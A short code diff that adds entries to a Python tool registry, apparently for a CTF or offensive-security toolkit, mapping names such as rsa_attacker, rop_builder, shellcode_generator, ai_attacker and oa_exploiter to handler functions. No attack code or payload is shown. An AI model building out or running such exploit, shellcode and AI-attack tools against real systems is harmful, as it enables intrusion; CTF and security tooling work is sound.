+    # Crypto工具
+    "crypto_identifier": crypto_identifier_handler,
+    "classical_cipher_solver": classical_cipher_solver_handler,
+    "rsa_attacker": rsa_attacker_handler,
+    "hash_analyzer": hash_analyzer_handler,
+    "encoding_decoder": encoding_decoder_handler,
+    # Pwn工具
+    "binary_analyzer": binary_analyzer_handler,
+    "rop_builder": rop_builder_handler,
+    "shellcode_generator": shellcode_generator_handler,
+    # AI Security工具
+    "ai_attacker": ai_attacker_handler,
+    # OA Exploit工具
+    "oa_exploiter": oa_exploiter_handler
 }
 
 
